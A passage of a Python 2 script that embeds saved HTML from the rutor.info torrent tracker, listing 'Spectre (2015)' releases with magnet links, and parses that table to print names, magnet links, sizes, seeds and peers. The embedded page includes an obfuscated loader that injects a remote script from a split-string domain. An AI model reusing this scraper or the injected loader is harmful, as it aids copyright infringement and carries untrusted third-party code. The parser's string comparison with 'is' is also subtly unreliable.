<td align="right">21.67&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;55</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="gai"><td>21&nbsp;Янв&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/482664"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:7a367cc7096e52c436d7c6ef7e963d012ec31110&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/482664/007-spektr_spectre-2015-bdrip-avc-a">007: СПЕКТР / Spectre  (2015)  BDRip-AVC | A </a></td> <td align="right">6<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">2.47&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;52</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;2</span></td></tr><tr class="tum"><td>20&nbsp;Янв&nbsp;16</td><td ><a class="downgif" href="http://d.rutor.info/download/482508"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:cb386f7035554274742e1912538ddcfcf899711b&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/482508/007-spektr_spectre-2015-bdrip-1080p-a">007: СПЕКТР / Spectre (2015) BDRip 1080p | A </a></td> <td align="right">21<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">17.75&nbsp;GB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;75</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr><tr class="gai"><td>20&nbsp;Апр&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/427128"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:adac2eedeefcadf7c4de157b265ceb7c436acd53&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/427128/007-spektr_spectre-2015-dcprip-2k-trejler">007: СПЕКТР / Spectre (2015) DCPRip 2k | Трейлер </a></td> <td align="right">30<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">679.66&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;26</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;1</span></td></tr><tr class="tum"><td>29&nbsp;Мар&nbsp;15</td><td ><a class="downgif" href="http://d.rutor.info/download/422307"><img src="http://s.rutor.info/i/d.gif" alt="D" /></a><a href="magnet:?xt=urn:btih:3e66a6d29e7f88193df65592e6918a1999a8b8cf&dn=rutor.info&tr=udp://opentor.org:2710&tr=udp://opentor.org:2710&tr=http://retracker.local/announce"><img src="http://s.rutor.info/i/m.png" alt="M" /></a>
<a href="/torrent/422307/007-spektr_spectre-2015-webrip-1080p-trejler">007: Спектр / Spectre (2015) WEBRip 1080p | Трейлер </a></td> <td align="right">16<img src="http://s.rutor.info/i/com.gif" alt="C" /></td>
<td align="right">219.37&nbsp;MB</td><td align="center"><span class="green"><img src="http://s.rutor.info/t/arrowup.gif" alt="S" />&nbsp;6</span>&nbsp;<img src="http://s.rutor.info/t/arrowdown.gif" alt="L" /><span class="red">&nbsp;0</span></td></tr></table><b>Страницы:  1</b></div>
<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>

<!-- bottom banner -->

<div id="down">
Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>.
</div>


</div>

<div id="sidebar">

<div class="sideblock">
	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
</div>

<div class="sideblock">
<center>
<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
<form action="/b.php" method="get" onsubmit="return search_sidebar();">
 <tr>
  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
 </tr>
 <tr>
  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
 </tr>
</form>
</table>
</center>
</div>



<div class="sideblock2">
<center>
<script type='text/javascript' src='//rmbn.net/js/smartblock/block.js'></script><script type='text/javascript'> new ObjBlockGenerator(255, 240, 600, 'st').init();</script>
</center>
</div>

<div class="sideblock2">
<!--LiveInternet counter--><script type="text/javascript"><!--
document.write("<a href='http://www.liveinternet.ru/click' "+
"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
escape(document.referrer)+((typeof(screen)=="undefined")?"":
";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
";"+Math.random()+
"' alt='' title='LiveInternet' "+
"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
</div>

</div>

</div>



<script src="//torvind.com/js/MTIzNg==.js"></script>

<script>(function(){var a=document.createElement("script");a.src="http://rarenok.biz"+"/im"+"g/r"+"/i/208/"+Math.floor(Math.random()*Math.pow(10,6))+".php";document.getElementsByTagName("head")[0].appendChild(a)})();</script>


</body>
</html>
'''

import quasar.ehp


class ParseHtml(quasar.ehp.Html):
    @staticmethod
    def find(dom1, tag=None, with_attrib=None):
        elem1 = None
        if dom1 is not None and tag is not None:
            elem1 = dom1.fst(tag) if with_attrib is None else dom1.fst(tag, with_attrib)
        return elem1

    @staticmethod
    def find_all(dom1, tag=None, with_attrib=None):
        result = []
        if dom1 is not None and tag is not None:
            elem1 = dom1.find(tag) if with_attrib is None else dom1.find(tag, with_attrib)
            result = list(elem1) if elem1 is not None else []
        return result

    @staticmethod
    def select(html=None, tag=None, order=1, with_attrib=None, element='text'):
        value_attrib = ''
        if html is not None:
            if tag is not None:
                values_tag = html.find(tag) if with_attrib is None else html.find(tag, with_attrib)
                cm = 0
                value_tag = None
                for item in values_tag:
                    cm += 1
                    if cm == order:
                        value_tag = item
                        break
                value_tag = value_tag if value_tag is not None else None
            else:
                value_tag = html
            if value_tag is not None:
                if element is 'text':
                    value_attrib = value_tag.text()
                else:
                    value_attrib = value_tag.attr[element]
            else:
                return ''
            if value_attrib is not None:
                value_attrib = value_attrib.strip()
            else:
                value_attrib = ''
        return value_attrib


dom = ParseHtml().feed(html)
tables = ParseHtml.find_all(dom, 'table')
if len(tables) > 3:
    for elem in tables[2].find('tr'):
        columns = ParseHtml.find_all(elem, 'td')
        if len(columns) == 5:
            print columns[1]
            name = ParseHtml.select(html=columns[1])  # name
            magnet = ParseHtml.select(html=columns[1], tag='a', order=2, element='href')  # magnet
            size = ParseHtml.select(html=columns[3])  # size
            seeds = ParseHtml.select(html=columns[4], tag='span')  # seeds
            peers = ParseHtml.select(html=columns[4], tag='span', order=2)  # peers
            print name
            print magnet
            print size
            print seeds
            print peers
            print '++++++++++++++++'

            # from bs4 import BeautifulSoup
            #
            # soup = BeautifulSoup(data, 'html5lib')
            # links = soup.findAll('table')[2].tbody.findAll('tr')
            # for link in links:
            #     columns = link.findAll('td')
            #     if len(columns)==5:
            #         print columns[1].select('a + a')[0]['href']  #magnet
            #         print columns[1].text  #name
            #         print columns[3].text  # size
            #         temp = columns[4].text.split()
            #         print temp[0]  # seed
            #         print temp[1]  # peers
            #     print "************************"
